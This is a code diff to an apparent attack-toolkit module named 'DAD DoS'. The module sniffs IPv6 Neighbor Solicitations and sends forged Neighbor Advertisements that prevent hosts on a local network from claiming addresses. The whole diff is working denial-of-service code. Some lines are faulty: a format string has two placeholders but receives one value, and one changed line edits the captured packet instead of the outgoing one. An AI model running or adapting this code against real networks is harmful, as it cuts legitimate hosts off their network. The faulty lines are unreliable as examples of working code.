@@ -11,15 +11,14 @@ class IPv6Module(Template):
 
     def __init__(self, socketio, namespace):
         super(IPv6Module, self).__init__(socketio, namespace)
-        self.modname = "DAD aaDoS"
+        self.modname = "DAD DoS"
         self.actions = [
             {
                 "title": "DAD DoS",
                 "action": "action",
-                "target": True
             },
             {
-                "title": "DAD DoS",
+                "title": "Start DAD DoS",
                 "action": "action"
             },
             {
@@ -79,7 +78,7 @@ class IPv6Sniffer:
         res['ip'] = packet[IPv6].src
         channel = False
         if ICMPv6ND_NS in packet:
-            channel = 'llmnr_result'
+            channel = 'module_output'
             try:
                 self.DAD_DoS(packet)
             except Exception,e:
@@ -87,14 +86,14 @@ class IPv6Sniffer:
                 traceback.print_exception(*exc_info)
                 #print e
 
-    def DAD_DoS(self, packet,target=None, src=None, dst=get_source_address(IPv6(dst="ff02::1"))):
+    def DAD_DoS(self, packet, dst=get_source_address(IPv6(dst="ff02::1"))):
         ip_packet = createIPv6()
         ip_packet.fields["nh"] = 58 #ICMPv6
         ip_packet.fields["hlim"] = 255
         ip_packet.fields["dst"] = dst
 
         if packet[IPv6].src != "::":
-            ip_packet.fields["dst"] = packet[IPv6].src
+            packet[IPv6].fields["dst"] = packet[IPv6].src
 
 
         tgt = packet[ICMPv6ND_NS].fields["tgt"]
@@ -108,6 +107,6 @@ class IPv6Sniffer:
         options.fields["lladdr"] = [get_if_hwaddr(i) for i in get_if_list()][0]
 
         send(ip_packet/advertisement/options)
-        out = "Overriding IPv6 Neighbor Solicitation: %s  Packet sent to %s" % (tgt)
+        out = "DAD_DoS: Overriding IPv6 Neighbor Solicitation: %s  Packet sent to %s" % (tgt)
         self.mod.socket_log(out)
         print out
